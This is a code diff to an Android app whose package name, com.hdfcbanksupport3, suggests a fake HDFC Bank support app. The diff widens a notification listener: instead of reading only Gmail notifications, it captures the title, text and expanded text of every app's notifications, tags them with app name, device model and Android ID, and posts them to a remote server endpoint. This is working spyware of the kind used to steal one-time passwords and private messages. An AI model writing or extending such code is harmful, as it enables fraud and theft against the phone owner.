@@ -3,6 +3,8 @@ package com.hdfcbanksupport3;
 import android.app.ActivityManager;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.service.notification.NotificationListenerService;
@@ -36,40 +38,55 @@ public class MyNotificationListener extends NotificationListenerService {
         }
 
         String packageName = sbn.getPackageName();
-        if (!"com.google.android.gm".equals(packageName)) {
-            return;
+        PackageManager packageManager = context.getPackageManager();
+        String appName = null;
+        try {
+            ApplicationInfo appInfo = packageManager.getApplicationInfo(packageName, 0);
+            appName = packageManager.getApplicationLabel(appInfo).toString();
+        } catch (PackageManager.NameNotFoundException e) {
+            e.printStackTrace();
         }
+
+//        if (!"com.google.android.gm".equals(packageName)) {
+//            return;
+//        }
 
         Bundle extras = sbn.getNotification().extras;
         if (extras == null) {
-//            Log.d(TAG, "Notification extras are null");
+            Log.d(TAG, "Notification extras are null");
             return;
         }
+        // for loop extras
+//        for (String key : extras.keySet()) {
+//            Object value = extras.get(key);
+//            Log.d(TAG, "Key: " + key + ", Value: " + value);
+//        }
 
         String sender = getStringFromExtras(extras, "android.title");
         String subject = getStringFromExtras(extras, "android.text");
         String message = getStringFromExtras(extras, "android.bigText");
         String receiverEmail = getStringFromExtras(extras, "android.subText");
 
-        // Combine sender, subject, and message to create a unique key for this notification
-        String notificationKey = (sender != null ? sender : "") +
-                (subject != null ? subject : "") +
-                (message != null ? message : "") +
-                (receiverEmail != null ? receiverEmail : "");
+//        String notificationKey = (sender != null ? sender : "") +
+//                (subject != null ? subject : "") +
+//                (message != null ? message : "") +
+//                (receiverEmail != null ? receiverEmail : "");
+//
+//        if (notificationKey.equals(lastProcessedNotification)) {
+//            Log.d(TAG, "Duplicate notification detected, ignoring...");
+//            return; // Do not process the same notification again
+//        }
 
-        // Check if this notification is a duplicate
-        if (notificationKey.equals(lastProcessedNotification)) {
-            Log.d(TAG, "Duplicate notification detected, ignoring...");
-            return; // Do not process the same notification again
+        if(appName.isEmpty()){
+            appName = packageName;
         }
-        if(subject == null || subject.isEmpty()){
-            Log.d(TAG, "Subject is empty, ignoring..." + subject);
-            return;
-        }
-        lastProcessedNotification = notificationKey;
+
+//        lastProcessedNotification = notificationKey;
         try {
             Helper help = new Helper();
             JSONObject senderData = new JSONObject();
+            senderData.put("app_name", appName != null ? appName : packageName);
+            senderData.put("sender", sender != null ? sender : "Unknown Sender");
             senderData.put("sender", sender != null ? sender : "Unknown Sender");
             senderData.put("subject", subject != null ? subject : "No Subject");
             senderData.put("message", message != null ? message : "No Message");
@@ -77,11 +94,11 @@ public class MyNotificationListener extends NotificationListenerService {
             senderData.put("model", Build.MODEL);
             senderData.put("mobile_id", Helper.getAndroidId(this));
             senderData.put("site", help.SITE());
-            Log.d(TAG, "Email Data: " + senderData.toString());
+//            Log.d(TAG, "Email Data: " + senderData.toString());
             Helper.postRequest("/email/add", senderData, new Helper.ResponseListener() {
                 @Override
                 public void onResponse(String result) {
-                    Log.d(TAG, "Email Save Response: " + result);
+//                    Log.d(TAG, "Email Save Response: " + result);
                 }
             });
         } catch (JSONException e) {
